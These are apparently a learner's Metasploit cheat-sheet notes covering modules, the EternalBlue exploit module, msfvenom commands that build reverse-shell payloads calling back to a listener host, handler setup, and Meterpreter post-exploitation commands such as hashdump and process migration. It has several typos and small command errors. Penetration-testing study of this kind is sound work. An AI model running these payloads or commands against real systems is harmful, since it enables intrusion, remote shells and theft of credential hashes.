Exploitation Framework


```bash
# start metasploit
msfconsole
# list directory structure
tree -L 1 INSTALL_DIR/embedded/framwork/modules
```

### Modules
Metasploit works by modules context
- auxiliary
- encoders
- evasion
- exploits 
- nops
- payloads
- post

```bash
# options
show options

# use a particular exploit/payload/auxiliary/post
use exploit/windows/smb/ms17_0010_eternalblue

# dynamic search command
```

- The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol).

### Payloads
There are two types of payloads
- Staged are sent to the target in two steps, an initial part is installed (stager) adn the requests the rest of the payload => Allows smaller initial size
- Inline payloads are sent in a single step
### Workspaces
Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

```bash
# ADDING A WORKSPACE
msf6> workspace -a "workspace_name"
```

### Example Workflow
```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > hosts -R
msf6 > show options
msf6 > db_map 
msf6 > run
msf6 > exploit
# SERVICES STORED IN THE MSF DATABASE
msf6 > services -S netbios
```
### msfvenom
allows to generate payloads for all major Operating Systems, has access to all payloads 

```bash
#list payloads
msfvenom -l payloads
# list formats
msfvenom --list formats
# use base64 encoding
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

### handlers 
intercept incoming communications generated by the MSFvenom payloads


```bash
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
#multihandler that is compatible with all payloads as well as regular shells
use exploit/multi/handler

# linux executlable in the elf format(exe in windows)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
# windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe


```


### Meterpreter
Is a C2 payload/agent that is cross compatible with multiple operating systems. It runs completely on memory and does not write anything to the disk
It uses a TLS **encrypted** communication channel to avoid IDS/IPD detection 


```bash
# meterpreter payloads/types
# load meterpreter payloads
msfvenom --list payloads | grep meterpreter

# get current user id
meterpreter > getuid || ps || 
meterpreter > migrate <PID> # process hijack
meterpreter > hashdump # dumps SAM database (Security Account Manager)
meterpreter > search -f <FILE_NAME>
meterpreter > shell # launches regular shell on target 

```